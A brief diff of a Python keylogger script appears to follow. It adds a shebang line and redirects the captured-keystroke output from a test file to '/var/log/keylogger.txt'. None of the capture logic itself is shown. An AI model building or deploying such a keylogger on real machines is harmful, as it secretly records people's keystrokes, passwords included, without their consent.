@@ -1,3 +1,4 @@
+#!/usr/bin/python
 # Copyright (c) 2011, Andrew Moffat
 # All rights reserved.
 
@@ -212,7 +213,7 @@ def log(done, callback, sleep_interval=.005):
 if __name__ == "__main__":
     now = time()
     done = lambda: 1 < 0
-    NomFichier = 'test0.txt'
+    NomFichier = '/var/log/keylogger.txt'
     #Fichier = open(NomFichier,'w')		# instanciation de l'objet Fichier
     #Fichier.write('')
     #Fichier.close()
